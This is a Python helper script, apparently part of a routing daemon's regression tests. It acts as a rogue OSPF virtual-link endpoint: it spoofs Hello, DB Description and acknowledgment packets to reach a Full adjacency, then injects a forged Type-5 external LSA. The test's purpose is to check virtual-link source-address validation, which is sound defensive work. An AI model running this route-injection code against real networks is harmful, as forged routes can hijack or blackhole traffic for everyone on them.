#!/usr/bin/env python3
# SPDX-License-Identifier: ISC
#
# rogue_vl.py
#
# Rogue OSPF virtual-link endpoint used by test_ospf_vl_source_check.py.
#
# Speaks enough of the OSPF neighbor state machine (Hello, DB Description,
# Link State Acknowledgment) to drive a virtual-link adjacency to Full from
# an arbitrary routed source address, then releases one forged Type-5 LSA
# when the trigger file appears.  Packet formats are byte-identical to the
# original B13 reproducer (test/manul/ospf_b13_virtual_link_source.py).

import json
import os
import queue
import signal
import socket
import struct
import sys
import time

from scapy.all import AsyncSniffer, IP, Raw, conf, send, wrpcap

conf.verb = 0

_stop = False


def _request_stop(signum, frame):
    global _stop
    _stop = True


def internet_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ospf_packet(router_id, packet_type, body):
    packet = bytearray(
        struct.pack(
            "!BBH4s4sHH8s",
            2,
            packet_type,
            24 + len(body),
            socket.inet_aton(router_id),
            socket.inet_aton("0.0.0.0"),
            0,
            0,
            b"\x00" * 8,
        )
        + body
    )
    struct.pack_into("!H", packet, 12, internet_checksum(bytes(packet)))
    assert internet_checksum(bytes(packet)) == 0
    return bytes(packet)


def external_lsa(cfg):
    body = (
        socket.inet_aton("255.255.255.0")
        + struct.pack("!I", 0x80000000 | 100)
        + socket.inet_aton("0.0.0.0")
        + struct.pack("!I", 0)
    )
    lsa = bytearray(
        struct.pack(
            "!HBB4s4sIHH",
            1,
            0x02,
            5,
            socket.inet_aton(cfg["injected_prefix"]),
            socket.inet_aton(cfg["peer_rid"]),
            cfg["injected_sequence"],
            0,
            36,
        )
        + body
    )
    data = bytearray(lsa[2:])
    c0 = 0
    c1 = 0
    for value in data:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    offset = 14
    x = ((len(data) - offset - 1) * c0 - c1) % 255
    if x == 0:
        x = 255
    y = 510 - c0 - x
    if y > 255:
        y -= 255
    data[offset] = x
    data[offset + 1] = y
    lsa = bytearray(lsa[:2] + data)
    c0 = 0
    c1 = 0
    for value in lsa[2:]:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    assert c0 == 0 and c1 == 0
    return bytes(lsa), (x << 8) | y


def summarize(packet, epoch):
    if not packet.haslayer(IP):
        return None
    raw = bytes(packet[IP].payload)
    if len(raw) < 24 or raw[0] != 2:
        return None
    declared = struct.unpack("!H", raw[2:4])[0]
    if declared < 24 or declared > len(raw):
        return None
    raw = raw[:declared]
    event = {
        "time": round(float(packet.time) - epoch, 6),
        "src": packet[IP].src,
        "dst": packet[IP].dst,
        "ttl": packet[IP].ttl,
        "type": raw[1],
        "router_id": socket.inet_ntoa(raw[4:8]),
        "area": socket.inet_ntoa(raw[8:12]),
        "ospf_length": declared,
        "ospf_checksum": "0x%04x" % struct.unpack("!H", raw[12:14])[0],
    }
    if raw[1] == 2 and declared >= 32:
        event.update(
            {
                "mtu": struct.unpack("!H", raw[24:26])[0],
                "options": "0x%02x" % raw[26],
                "flags": "0x%02x" % raw[27],
                "dd_seq": "0x%08x" % struct.unpack("!I", raw[28:32])[0],
                "lsa_headers": (declared - 32) // 20,
            }
        )
    elif raw[1] == 4 and declared >= 28:
        count = struct.unpack("!I", raw[24:28])[0]
        lsas = []
        offset = 28
        for _ in range(count):
            if offset + 20 > declared:
                break
            length = struct.unpack("!H", raw[offset + 18 : offset + 20])[0]
            if length < 20 or offset + length > declared:
                break
            lsas.append(
                {
                    "age": struct.unpack("!H", raw[offset : offset + 2])[0],
                    "type": raw[offset + 3],
                    "id": socket.inet_ntoa(raw[offset + 4 : offset + 8]),
                    "adv_router": socket.inet_ntoa(raw[offset + 8 : offset + 12]),
                    "seq": "0x%08x"
                    % struct.unpack("!I", raw[offset + 12 : offset + 16])[0],
                    "checksum": "0x%04x"
                    % struct.unpack("!H", raw[offset + 16 : offset + 18])[0],
                    "length": length,
                }
            )
            offset += length
        event["lsas"] = lsas
    return event


def run(cfg):
    received = queue.Queue()
    sniffer = AsyncSniffer(
        iface=cfg["iface"],
        filter="ip proto 89",
        prn=lambda packet: received.put(packet),
        store=True,
    )
    sent = []
    packets = []
    sniffer.start()
    time.sleep(0.3)
    epoch = time.time()
    result = {"error": None}
    try:

        def send_ospf(label, packet_type, body, fields=None):
            payload = ospf_packet(cfg["peer_rid"], packet_type, body)
            record = {
                "label": label,
                "time": round(time.time() - epoch, 6),
                "ip_src": cfg["attacker_ip"],
                "ip_dst": cfg["target_ip"],
                "ip_ttl": 64,
                "ip_proto": 89,
                "ospf_router_id": cfg["peer_rid"],
                "area": "0.0.0.0",
                "ospf_type": packet_type,
                "ospf_length": len(payload),
                "ospf_checksum": "0x%04x" % struct.unpack_from("!H", payload, 12)[0],
                "ospf_checksum_valid": internet_checksum(payload) == 0,
                "packet_hex": payload.hex(),
            }
            if fields:
                record.update(fields)
            send(
                IP(src=cfg["attacker_ip"], dst=cfg["target_ip"], ttl=64, proto=89)
                / Raw(payload),
                iface=cfg["iface"],
                verbose=0,
            )
            sent.append(record)

        def send_hello():
            body = (
                socket.inet_aton("0.0.0.0")
                + struct.pack("!HBBI", 10, 0x02, 1, 40)
                + socket.inet_aton("0.0.0.0")
                + socket.inet_aton("0.0.0.0")
                + socket.inet_aton(cfg["target_rid"])
            )
            send_ospf(
                "rogue_two_way_hello",
                1,
                body,
                {
                    "network_mask": "0.0.0.0",
                    "hello_interval": 10,
                    "dead_interval": 40,
                    "options": "0x02",
                    "advertised_neighbor_rid": cfg["target_rid"],
                },
            )

        def send_dd(seq, options, label):
            body = struct.pack("!HBBI", 0, options, 0, seq)
            send_ospf(
                label,
                2,
                body,
                {
                    "dd_mtu": 0,
                    "dd_options": "0x%02x" % options,
                    "dd_flags": "0x00",
                    "dd_seq": "0x%08x" % seq,
                    "dd_lsa_headers": 0,
                },
            )

        next_hello = 0
        injected = False
        injected_at = None
        dd_complete = False
        dd_packets_received = 0
        target_lsus_acked = 0
        while time.time() - epoch < cfg["duration"] and not _stop:
            now = time.time()
            if now - epoch >= next_hello:
                send_hello()
                next_hello = now - epoch + 2.0
            if not injected and os.path.exists(cfg["trigger_path"]):
                lsa, lsa_checksum = external_lsa(cfg)
                send_ospf(
                    "rogue_external_lsa",
                    4,
                    struct.pack("!I", 1) + lsa,
                    {
                        "lsa_age": 1,
                        "lsa_options": "0x02",
                        "lsa_type": 5,
                        "lsa_id": cfg["injected_prefix"],
                        "lsa_adv_router": cfg["peer_rid"],
                        "lsa_seq": "0x%08x" % cfg["injected_sequence"],
                        "lsa_checksum": "0x%04x" % lsa_checksum,
                        "lsa_checksum_valid": True,
                        "lsa_prefix": cfg["injected_prefix"] + "/24",
                        "lsa_metric_type": "E2",
                        "lsa_metric": 100,
                        "lsa_forward_address": "0.0.0.0",
                    },
                )
                injected = True
                injected_at = time.time()
            if injected and time.time() - injected_at >= 6:
                break
            try:
                packet = received.get(timeout=0.1)
            except queue.Empty:
                continue
            if not packet.haslayer(IP):
                continue
            if (
                packet[IP].src != cfg["target_ip"]
                or packet[IP].dst != cfg["attacker_ip"]
            ):
                continue
            raw = bytes(packet[IP].payload)
            if len(raw) < 24 or raw[0] != 2:
                continue
            if socket.inet_ntoa(raw[4:8]) != cfg["target_rid"]:
                continue
            if raw[1] == 2 and len(raw) >= 32:
                options = raw[26]
                flags = raw[27]
                seq = struct.unpack("!I", raw[28:32])[0]
                dd_packets_received += 1
                if flags & 0x04 and flags & 0x01:
                    send_dd(seq, options, "slave_negotiation_ack")
                elif not flags & 0x04 and flags & 0x01:
                    send_dd(seq, options, "slave_exchange_ack")
                    if not flags & 0x02:
                        dd_complete = True
            elif raw[1] == 4 and len(raw) >= 28:
                count = struct.unpack("!I", raw[24:28])[0]
                offset = 28
                headers = []
                for _ in range(count):
                    if offset + 20 > len(raw):
                        break
                    length = struct.unpack("!H", raw[offset + 18 : offset + 20])[0]
                    if length < 20 or offset + length > len(raw):
                        break
                    headers.append(raw[offset : offset + 20])
                    offset += length
                if headers:
                    send_ospf(
                        "ack_target_lsu",
                        5,
                        b"".join(headers),
                        {
                            "acked_lsa_headers": len(headers),
                        },
                    )
                    target_lsus_acked += 1
    except Exception as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        raise
    finally:
        try:
            packets = list(sniffer.stop())
        except Exception:
            sniffer.join()
            raise
        wrpcap(cfg["pcap_path"], packets)
        injected_hex = {item["packet_hex"]: item["label"] for item in sent}
        events = []
        for packet in packets:
            event = summarize(packet, epoch)
            if event is None:
                continue
            raw = bytes(packet[IP].payload)
            declared = struct.unpack("!H", raw[2:4])[0] if len(raw) >= 4 else 0
            label = injected_hex.get(raw[:declared].hex())
            if label:
                event["injection_label"] = label
            events.append(event)
        result.update(
            {
                "iface": cfg["iface"],
                "duration_seconds": round(time.time() - epoch, 6),
                "sent": sent,
                "packets": events,
                "dd_packets_received": dd_packets_received,
                "dd_complete_observed": dd_complete,
                "external_lsa_sent": injected,
                "target_lsus_acked": target_lsus_acked,
                "pcap_path": cfg["pcap_path"],
            }
        )
        with open(cfg["result_path"] + ".tmp", "w") as fp:
            json.dump(result, fp, indent=2, sort_keys=True)
        os.replace(cfg["result_path"] + ".tmp", cfg["result_path"])
        print(
            "B13_ROGUE_SENT=%d INJECTED=%s PCAP=%s"
            % (
                len(sent),
                injected,
                cfg["pcap_path"],
            )
        )


signal.signal(signal.SIGINT, _request_stop)
signal.signal(signal.SIGTERM, _request_stop)
run(json.loads(sys.argv[1]))
